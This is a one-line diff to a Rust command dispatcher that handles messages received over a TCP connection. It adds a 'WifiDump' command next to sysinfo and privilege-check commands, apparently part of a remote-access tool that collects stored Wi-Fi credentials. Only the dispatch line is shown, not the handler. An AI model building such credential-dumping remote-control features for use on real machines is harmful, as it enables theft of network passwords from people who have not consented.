@@ -13,6 +13,7 @@ pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool,
 
         // System interaction
         InstructMessage::SysInfo => system::sysinfo(conn), // sysinfo
+        InstructMessage::WifiDump => system::wifidump(conn),
         InstructMessage::Check => system::check_privileges(conn), // check
         InstructMessage::Display(content) => system::display_message(content), // display
 
